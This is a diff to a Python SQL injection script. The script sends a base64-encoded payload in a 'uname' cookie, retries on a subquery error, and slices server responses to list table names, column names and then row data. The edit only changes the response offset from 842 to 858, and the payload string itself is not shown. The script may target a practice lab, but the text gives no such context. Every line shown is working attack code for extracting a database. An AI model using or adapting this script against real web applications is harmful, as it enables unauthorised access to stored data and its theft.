@@ -14,7 +14,7 @@ cookies = {"uname": base64.b64encode(
 response = requests.post(url, cookies=cookies)
 while('Subquery returns more than 1 row' in response.text):
     response = requests.post(url, cookies=cookies)
-temp = response.text[842+len(base64.b64encode(
+temp = response.text[858+len(base64.b64encode(
     payload.format(get_table).encode("ascii")).decode()):-233]
 tables = temp.split(',')
 for i in tables:
@@ -25,7 +25,7 @@ for i in tables:
     response = requests.post(url, cookies=cookies)
     while('Subquery returns more than 1 row' in response.text):
         response = requests.post(url, cookies=cookies)
-    temp = response.text[842+len(base64.b64encode(
+    temp = response.text[858+len(base64.b64encode(
         payload.format(find).encode("ascii")).decode()):-233]
     columns = temp.split(',')
     print("Columns : ", *columns)
@@ -38,4 +38,4 @@ for i in tables:
         while('Subquery returns more than 1 row' in response.text):
             response = requests.post(url, cookies=cookies)
         print(
-            response.text[842+len(base64.b64encode(payload.format(find).encode("ascii")).decode()):-233])
+            response.text[858+len(base64.b64encode(payload.format(find).encode("ascii")).decode()):-233])
